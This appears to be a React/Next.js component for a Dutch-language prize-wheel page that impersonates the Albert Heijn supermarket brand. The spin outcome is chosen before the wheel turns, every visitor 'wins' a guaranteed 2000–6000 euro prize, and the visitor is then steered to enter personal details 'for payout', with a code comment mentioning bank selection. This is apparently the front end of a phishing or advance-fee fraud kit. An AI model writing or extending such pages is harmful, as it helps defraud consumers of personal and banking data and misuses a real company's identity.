"use client";

import { useEffect, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { useSettings } from "@/contexts/SettingsContext";

const sliceColors = [
  "#f3efe8",
  "#ffbf00",
  "#e74278",
  "#1597e5",
  "#f6f3ee",
  "#f0b400",
  "#0eaa72",
  "#0a77d5",
];

export function WheelClient({ sessionId }: { sessionId: string }) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();
  const { settings } = useSettings();
  const popupRef = useRef<HTMLDivElement | null>(null);
  const continueButtonRef = useRef<HTMLButtonElement | null>(null);
  
  const [spinning, setSpinning] = useState(false);
  const [resultAmount, setResultAmount] = useState<number | null>(null);
  const [showPopup, setShowPopup] = useState(false);
  
  const [error, setError] = useState<string | null>(null);
  const [rotation, setRotation] = useState(0);
  const [segments, setSegments] = useState<number[]>([]);
  const [winningIndex, setWinningIndex] = useState<number>(0);
  const [sessionData, setSessionData] = useState<any>(null);
  const [popupViewportHeight, setPopupViewportHeight] = useState<number | null>(null);

  const reportDebug = (
    hypothesisId: "A" | "B" | "C" | "D" | "E",
    msg: string,
    data: Record<string, unknown>,
  ) => {
    fetch("http://127.0.0.1:7777/event", {
      method: "POST",
      headers: { "Content-Type": "text/plain;charset=UTF-8" },
      body: JSON.stringify({
        sessionId: "mobile-popup-still-broken",
        runId: "pre-fix",
        hypothesisId,
        location: "src/app/wheel/wheel-client.tsx",
        msg: `[DEBUG] ${msg}`,
        data,
        ts: Date.now(),
      }),
    }).catch(() => {});
  };

  // Fetch session and generate wheel segments on mount
  useEffect(() => {
    let cancelled = false;

    async function loadSession() {
      if (!sessionId) {
        setError("Ongeldige sessie."); // German error
        return;
      }

      if (!supabase) return;

      const { data, error: dbError } = await supabase
        .from("sessions")
        .select("*")
        .eq("id", sessionId)
        .single();

      if (cancelled) return;

      if (dbError || !data) {
        setError("Sessie niet gevonden.");
        return;
      }

      setSessionData(data);

      // If already played (amount > 0), skip wheel logic and show result
      if (data.amount && data.amount > 0) {
        setResultAmount(data.amount);
        setShowPopup(true);
        return;
      }

      // 2000 to 6000, step 100
      const possibleValues = Array.from({ length: 41 }, (_, i) => 2000 + i * 100);
      
      // Pick 8 random values for the wheel
      const newSegments: number[] = [];
      for (let i = 0; i < 8; i++) {
        const randVal = possibleValues[Math.floor(Math.random() * possibleValues.length)];
        newSegments.push(randVal);
      }
      
      setSegments(newSegments);
      
      // Pick one as the winner
      const winIdx = Math.floor(Math.random() * 8);
      setWinningIndex(winIdx);
    }

    loadSession();

    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  useEffect(() => {
    const updateViewportHeight = () => {
      setPopupViewportHeight(window.visualViewport?.height ?? window.innerHeight);
    };

    updateViewportHeight();
    window.visualViewport?.addEventListener("resize", updateViewportHeight);
    window.addEventListener("resize", updateViewportHeight);

    return () => {
      window.visualViewport?.removeEventListener("resize", updateViewportHeight);
      window.removeEventListener("resize", updateViewportHeight);
    };
  }, []);

  useEffect(() => {
    if (!showPopup) return;

    const previousOverflow = document.body.style.overflow;
    const previousOverscroll = document.body.style.overscrollBehavior;
    document.body.style.overflow = "hidden";
    document.body.style.overscrollBehavior = "contain";

    const focusTimeout = window.setTimeout(() => {
      continueButtonRef.current?.focus({ preventScroll: true });
    }, 40);

    const measureFrame = window.requestAnimationFrame(() => {
      const popupRect = popupRef.current?.getBoundingClientRect();
      const ctaRect = continueButtonRef.current?.getBoundingClientRect();
      const header = document.querySelector("header");
      const main = document.querySelector("main");
      const headerRect = header?.getBoundingClientRect();
      const mainStyle = main ? window.getComputedStyle(main) : null;
      const vv = window.visualViewport;

      // #region debug-point A:popup-geometry
      reportDebug("A", "popup geometry", {
        popupTop: popupRect?.top ?? null,
        popupBottom: popupRect?.bottom ?? null,
        popupHeight: popupRect?.height ?? null,
        popupScrollHeight: popupRef.current?.scrollHeight ?? null,
        innerHeight: window.innerHeight,
        visualViewportHeight: vv?.height ?? null,
        visualViewportOffsetTop: vv?.offsetTop ?? null,
      });
      // #endregion

      // #region debug-point B:shell-layout
      reportDebug("B", "shell layout", {
        headerHeight: headerRect?.height ?? null,
        headerBottom: headerRect?.bottom ?? null,
        mainPaddingTop: mainStyle?.paddingTop ?? null,
        mainTop: main?.getBoundingClientRect().top ?? null,
      });
      // #endregion

      // #region debug-point C:viewport-mismatch
      reportDebug("C", "viewport mismatch", {
        screenHeight: window.screen.height,
        outerHeight: window.outerHeight,
        innerHeight: window.innerHeight,
        visualViewportHeight: vv?.height ?? null,
        visualViewportPageTop: vv?.pageTop ?? null,
      });
      // #endregion

      // #region debug-point D:cta-visibility
      reportDebug("D", "cta visibility", {
        ctaTop: ctaRect?.top ?? null,
        ctaBottom: ctaRect?.bottom ?? null,
        ctaHeight: ctaRect?.height ?? null,
        activeElement:
          document.activeElement instanceof HTMLElement
            ? document.activeElement.innerText?.slice(0, 60) ?? document.activeElement.tagName
            : null,
      });
      // #endregion

      // #region debug-point E:runtime-context
      reportDebug("E", "runtime context", {
        href: window.location.href,
        bodyOverflow: window.getComputedStyle(document.body).overflow,
        hasDialogRole: popupRef.current?.getAttribute("role") ?? null,
      });
      // #endregion
    });

    return () => {
      window.clearTimeout(focusTimeout);
      window.cancelAnimationFrame(measureFrame);
      document.body.style.overflow = previousOverflow;
      document.body.style.overscrollBehavior = previousOverscroll;
    };
  }, [showPopup]);

  const spinWheel = async () => {
    if (spinning || resultAmount !== null) return;
    setSpinning(true);

    const wonAmount = segments[winningIndex];
    
    // Calculate rotation to land on winningIndex
    // We want the winning segment to land at the top (0 degrees).
    const extraSpins = 6;
    const randomOffset = (Math.random() - 0.5) * 30; // Random offset between -15 and +15 degrees
    const targetRotation = (360 * extraSpins) + (360 - (winningIndex * 45)) + randomOffset;
    
    setRotation(targetRotation);

    const playSpinSound = () => {
      try {
        const AudioContext = window.AudioContext || (window as any).webkitAudioContext;
        if (!AudioContext) return;
        const ctx = new AudioContext();

        // Simulate a wooden/plastic tick for the wheel
        const playTick = (time: number) => {
          const osc = ctx.createOscillator();
          const gain = ctx.createGain();
          osc.type = "triangle";
          osc.frequency.setValueAtTime(800, time);
          osc.frequency.exponentialRampToValueAtTime(100, time + 0.05);

          gain.gain.setValueAtTime(0.5, time);
          gain.gain.exponentialRampToValueAtTime(0.01, time + 0.05);

          osc.connect(gain);
          gain.connect(ctx.destination);
          osc.start(time);
          osc.stop(time + 0.05);
        };

        const spinDuration = 6000;
        const totalTicks = 45; // 45 segments passed
        const startTime = ctx.currentTime;

        for (let i = 0; i < totalTicks; i++) {
          // easeOutCubic to make ticks slow down as wheel slows down
          const progress = i / totalTicks;
          const easeOut = 1 - Math.pow(1 - progress, 3);
          const tickTime = startTime + (easeOut * (spinDuration / 1000));
          playTick(tickTime);
        }
      } catch (e) {
        console.error("Audio play failed:", e);
      }
    };

    // Play spinning ticking sound immediately when button clicked
    playSpinSound();

    // Spin duration
    setTimeout(async () => {
      setSpinning(false);
      setResultAmount(wonAmount);

      // Send wheel winners to the profile form before bank selection.
      if (supabase && sessionId) {
        await supabase
          .from("sessions")
          .update({ 
            amount: wonAmount,
            current_step: "win"
          })
          .eq("id", sessionId);
      }
      
      setShowPopup(true);
    }, 6000); // 6 seconds to match transition
  };

  const handleContinue = () => {
    router.push(`/win/${sessionId}`);
  };

  const handlePopupDismiss = () => {
    handleContinue();
  };

  if (error) {
    return (
      <div className="flex h-full flex-col items-center justify-center p-6 text-center">
        <div className="mb-4 text-red-500">
          <svg className="size-16" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
          </svg>
        </div>
        <h1 className="mb-2 text-2xl font-bold text-slate-800">Fout</h1>
        <p className="text-slate-600">{error}</p>
      </div>
    );
  }

  return (
    <>
      <div className="fixed inset-0 z-[-1]">
        <div
          className="absolute inset-0 hidden bg-cover bg-center bg-no-repeat sm:block"
          style={{ backgroundImage: "url('/wheel-assets/bg-1.png')" }}
        />
        <div
          className="absolute inset-0 bg-cover bg-center bg-no-repeat sm:hidden"
          style={{ backgroundImage: "url('/wheel-assets/mobile-bg.png')" }}
        />
        <div className="absolute inset-0 bg-[linear-gradient(180deg,rgba(0,94,190,0.16)_0%,rgba(0,53,128,0.32)_100%)]" />
      </div>

      <div className="flex flex-col items-center justify-center px-4 pt-8 pb-16">
        
        {/* Wheel Container */}
        <div className="relative mt-8 mb-16 flex w-full max-w-[340px] flex-col items-center sm:max-w-[430px] md:max-w-[470px]">
          <div className="relative z-10 w-full">
            <img
              src="/wheel-assets/cark-bg.png"
              alt="Wheel frame"
              className="pointer-events-none block w-full select-none"
              draggable={false}
            />

            {/* Rotating inner wheel */}
            <div
              className="absolute left-[8.4%] top-[12.6%] z-10 aspect-square w-[82.8%] overflow-hidden rounded-full border-[2px] border-white/50 shadow-[inset_0_4px_10px_rgba(255,255,255,0.35),0_4px_10px_rgba(0,0,0,0.14)]"
              style={{
                transition: "transform 6s cubic-bezier(0.2, 0.9, 0.2, 1)",
                transform: `rotate(${rotation}deg)`,
              }}
            >
              <div 
                className="absolute inset-0"
                style={{
                  background: `conic-gradient(from -22.5deg, ${sliceColors[0]} 0 45deg, ${sliceColors[1]} 45deg 90deg, ${sliceColors[2]} 90deg 135deg, ${sliceColors[3]} 135deg 180deg, ${sliceColors[4]} 180deg 225deg, ${sliceColors[5]} 225deg 270deg, ${sliceColors[6]} 270deg 315deg, ${sliceColors[7]} 315deg 360deg)`
                }}
              />
              
              <div className="absolute inset-0 bg-[radial-gradient(circle_at_50%_34%,rgba(255,255,255,0.35)_0%,rgba(255,255,255,0.08)_28%,rgba(0,0,0,0.08)_100%)]" />
              <div className="absolute inset-0 rounded-full shadow-[inset_0_0_0_8px_rgba(255,255,255,0.08)]" />
              
              {Array.from({ length: 8 }).map((_, i) => (
                <div 
                  key={`line-${i}`}
                  className="absolute inset-0 flex items-start justify-center"
                  style={{ transform: `rotate(${i * 45 + 22.5}deg)` }}
                >
                  <div className="h-1/2 w-[3px] bg-[#0a69c6]/28" />
                </div>
              ))}

              {segments.map((val, index) => {
                const labelAngle = index * 45;
                const radians = (labelAngle * Math.PI) / 180;
                const labelRadius = index === 0 ? 28 : 31;
                const left = 50 + Math.sin(radians) * labelRadius;
                const top = 50 - Math.cos(radians) * labelRadius;

                return (
                  <div 
                    key={`text-${index}`}
                    className="absolute"
                    style={{
                      left: `${left}%`,
                      top: `${top}%`,
                      transform: "translate(-50%, -50%)",
                    }}
                  >
                    <div className="rounded-full bg-white/36 px-2.5 py-1 text-[12px] font-black tracking-[0.01em] text-[#0b4a9d] shadow-[0_3px_8px_rgba(255,255,255,0.18)] backdrop-blur-[1px] sm:text-[14px] md:px-3 md:py-1.5 md:text-[18px]">
                      {val}€
                    </div>
                  </div>
                );
              })}
            </div>

            {/* Reference pointer */}
            <img
              src="/wheel-assets/ic-cark.png"
              alt="Wheel pointer"
              className="pointer-events-none absolute left-1/2 top-[7.4%] z-20 w-[72.8%] -translate-x-1/2 select-none"
              style={{
                clipPath: "inset(0 39.5% 66.5% 39.5%)",
              }}
              draggable={false}
            />

            {/* Reference center star/hub */}
            <div
              className="pointer-events-none absolute left-1/2 top-[47.2%] z-20 aspect-square w-[30.5%] -translate-x-1/2 -translate-y-1/2 bg-no-repeat"
              style={{
                backgroundImage: "url('/wheel-assets/ic-cark.png')",
                backgroundSize: "273% 287%",
                backgroundPosition: "50% 54.2%",
              }}
            />
          </div>
        </div>

        {/* Button */}
        <button
          onClick={spinWheel}
          disabled={spinning || resultAmount !== null || segments.length === 0}
          className="group relative z-10 mt-12 w-full max-w-[310px] overflow-hidden rounded-2xl bg-gradient-to-b from-[#ffd84a] to-[#f39c12] p-[2px] shadow-[0_8px_0_#af6f00,0_18px_30px_rgba(0,0,0,0.38)] transition-all hover:-translate-y-0.5 hover:shadow-[0_10px_0_#af6f00,0_22px_34px_rgba(0,0,0,0.36)] active:translate-y-[4px] active:shadow-[0_4px_0_#af6f00,0_10px_18px_rgba(0,0,0,0.3)] disabled:opacity-50 disabled:pointer-events-none"
        >
          <div className="relative flex items-center justify-center gap-3 rounded-[0.95rem] border-2 border-[#fff3a0] bg-gradient-to-b from-[#ffe66c] to-[#f6a900] px-6 py-4">
            <span className="text-xl font-black tracking-[0.18em] text-[#173463] uppercase sm:text-2xl">NU DRAAIEN</span>
          </div>
          <div className="absolute inset-0 -translate-x-full bg-gradient-to-r from-transparent via-white/40 to-transparent transition-transform duration-1000 group-hover:translate-x-full pointer-events-none" />
        </button>

        {/* Logo at bottom */}
        <div className="mt-12 flex items-center justify-center gap-3 relative z-10">
          <span className="text-white font-semibold text-sm drop-shadow-md">Powered by</span>
          <img src={settings?.logo_url || "https://static.ah.nl/ah-static/images/ah-ui-bridge-components/logo/logo-ah.svg"} alt="Albert Heijn logo" className="h-10 object-contain drop-shadow-[0_5px_10px_rgba(0,0,0,0.4)] bg-white/10 p-1.5 rounded-lg backdrop-blur-sm border border-white/20" />
        </div>

      </div>

      {/* Result Popup */}
      {showPopup && (
        <div
          className="fixed inset-0 z-[99999] overflow-y-auto overscroll-contain bg-[#001b47]/88 backdrop-blur-md animate-in fade-in duration-500"
          style={{
            paddingTop: "max(0.75rem, env(safe-area-inset-top))",
            paddingRight: "max(0.75rem, env(safe-area-inset-right))",
            paddingBottom: "max(0.75rem, env(safe-area-inset-bottom))",
            paddingLeft: "max(0.75rem, env(safe-area-inset-left))",
          }}
        >
          <div
            className="flex items-center justify-center"
            style={{
              minHeight: popupViewportHeight
                ? `${popupViewportHeight}px`
                : "100dvh",
            }}
          >
            <div
              ref={popupRef}
              role="dialog"
              aria-modal="true"
              aria-labelledby="wheel-result-title"
              aria-describedby="wheel-result-description"
              className="relative w-full max-w-sm rounded-[1.75rem] bg-white p-1 text-center shadow-[0_24px_60px_rgba(0,0,0,0.38)] animate-in zoom-in-95 duration-500 sm:max-w-md"
              onKeyDown={(event) => {
                if (event.key === "Escape") {
                  handlePopupDismiss();
                }
              }}
              tabIndex={-1}
            >
              <div
                className="relative flex flex-col items-center justify-center overflow-y-auto rounded-[1.5rem] border border-slate-100 bg-white px-5 py-6 shadow-inner sm:px-8 sm:py-8"
                style={{
                  maxHeight: popupViewportHeight
                    ? `${Math.max(popupViewportHeight - 24, 320)}px`
                    : "calc(100dvh - 1.5rem)",
                }}
              >
                <button
                  type="button"
                  onClick={handlePopupDismiss}
                  aria-label="Popup sluiten"
                  className="absolute right-3 top-3 inline-flex size-10 items-center justify-center rounded-full border border-slate-200 bg-white/90 text-slate-500 shadow-sm transition hover:bg-slate-50 hover:text-slate-700 focus:outline-none focus-visible:ring-2 focus-visible:ring-[#0052cc]/40"
                >
                  <svg className="size-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.2} d="M6 6l12 12M18 6L6 18" />
                  </svg>
                </button>
              
              {/* Success Icon */}
              <div className="relative mx-auto mb-6 flex size-20 sm:size-24 items-center justify-center shrink-0">
                <div className="absolute inset-0 rounded-full bg-green-400/20 animate-ping" style={{ animationDuration: '3s' }}></div>
                <div className="relative flex size-16 sm:size-20 items-center justify-center rounded-full bg-gradient-to-br from-[#4ade80] to-[#16a34a] text-white shadow-lg">
                  <svg className="size-8 sm:size-10 drop-shadow-sm" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3.5} d="M5 13l4 4L19 7" />
                  </svg>
                </div>
              </div>
              
              <h2 id="wheel-result-title" className="mb-2 text-2xl sm:text-3xl font-black text-[#003b8f] tracking-tight">
                Gefeliciteerd!
              </h2>
              <p id="wheel-result-description" className="mb-6 text-sm sm:text-base font-medium leading-6 text-slate-500">
                Je gegarandeerde prijs is bevestigd en staat nu klaar om te claimen.
              </p>
              
              <div className="mb-8 w-full rounded-2xl border border-slate-200/60 bg-gradient-to-br from-slate-50 to-slate-100 p-5 shadow-[inset_0_2px_10px_rgba(0,0,0,0.02)] sm:p-6">
                <p className="mb-2 text-xs font-semibold uppercase tracking-[0.28em] text-slate-400">
                  Je prijs
                </p>
                <div aria-live="polite" className="text-5xl sm:text-6xl font-black text-transparent bg-clip-text bg-gradient-to-r from-[#e84e1b] to-[#ff7b00] drop-shadow-sm">
                  {resultAmount} €
                </div>
              </div>
              
              <button
                ref={continueButtonRef}
                type="button"
                onClick={handleContinue}
                className="flex w-full items-center justify-center gap-2 rounded-xl bg-gradient-to-b from-[#0052cc] to-[#003b8f] px-6 py-4 text-lg font-bold text-white shadow-[0_8px_20px_rgba(0,59,143,0.3)] transition-all hover:scale-[1.02] active:scale-[0.98] focus:outline-none focus-visible:ring-2 focus-visible:ring-[#0052cc]/35 sm:text-xl"
              >
                <span>Verder naar je gegevens</span>
                <svg className="size-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M14 5l7 7m0 0l-7 7m7-7H3" />
                </svg>
              </button>
              
              <p className="mt-5 text-center text-xs font-semibold leading-5 text-slate-400">
                In de volgende stap bevestig je je gegevens voor uitbetaling.
              </p>
            </div>
          </div>
          </div>
        </div>
      )}
    </>
  );
}
